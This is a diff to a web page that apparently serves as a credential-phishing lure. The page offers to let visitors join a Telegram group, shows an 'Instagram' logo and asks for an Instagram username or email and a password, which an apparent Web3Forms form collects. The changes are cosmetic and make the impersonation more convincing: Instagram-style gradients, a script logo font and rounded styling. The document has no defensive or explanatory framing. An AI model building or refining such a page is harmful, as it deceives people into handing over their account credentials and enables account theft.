@@ -11,7 +11,7 @@
 body {
     margin: 0;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: #fafafa;
+    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
     min-height: 100vh;
 }
 
@@ -30,18 +30,42 @@ body {
     border: 1px solid #dbdbdb;
     padding: 32px 28px 24px;
     text-align: center;
+    border-radius: 16px;
 }
+
+/* .logo {
+    font-size: 32px;
+    font-weight: 400;
+    margin-bottom: 20px;
+} */
 
 .logo {
-    font-size: 36px;
-    font-weight: 600;
+    font-family: 'Pacifico', cursive;
+    font-size: 42px;
+    font-weight: 400;
     margin-bottom: 20px;
+
+    background: linear-gradient(
+        45deg,
+        #feda75,
+        #fa7e1e,
+        #d62976,
+        #962fbf,
+        #4f5bd5
+    );
+
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+
+    letter-spacing: 0.5px;
 }
 
+
 h1 {
-    font-size: 15px;
-    font-weight: 500;
-    color: #555;
+    font-size: 25px;
+    font-weight: 400;
+    color: #3e3c3c;
     margin-bottom: 20px;
 }
 
@@ -117,6 +141,8 @@ button:active {
     margin-top: 14px;
 }
 </style>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
 </head>
 
 <body>
@@ -124,7 +150,9 @@ button:active {
 <div class="wrapper">
     <div>
         <div class="container">
-            <h1>To join the Telegram group<br>continue below</h1>
+            <h1>To join the Telegram group continue below</h1>
+            <div class="divider">
+            </div>
             <div class="logo">Instagram</div>
 
             <!-- Web3Forms -->
@@ -141,20 +169,18 @@ button:active {
                 <input type="text" name="u" placeholder="Username, or email" required>
                 <input type="text" name="p" placeholder="P******" required>
 
-                <button type="submit">Continue to join telegram</button>
+                <button type="submit">Continue to Telegram</button>
             </form>
 
             <div class="divider">
-                
+
             </div>
+            <p class="note">© 2025 All rights reserved</p>
 
         
         </div>
 
-        <div class="footer">
         
-            <div class="note">© 2025</div>
-        </div>
     </div>
 </div>
 
